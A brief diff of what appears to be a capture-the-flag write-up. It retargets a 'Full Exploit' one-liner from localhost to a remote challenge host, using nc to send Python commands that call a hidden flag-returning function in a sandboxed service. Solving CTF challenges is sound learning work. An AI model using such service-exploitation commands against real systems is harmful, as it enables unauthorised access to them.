@@ -123,7 +123,7 @@ dir(__main__)
 
 ### Full Exploit
 ```bash
-echo -e 'dir()\nFLAG_HOLDER()' | nc localhost 9999
+echo -e 'dir()\nFLAG_HOLDER()' | nc ctf.dscjssstuniv.in 9999
 ```
 
 ---
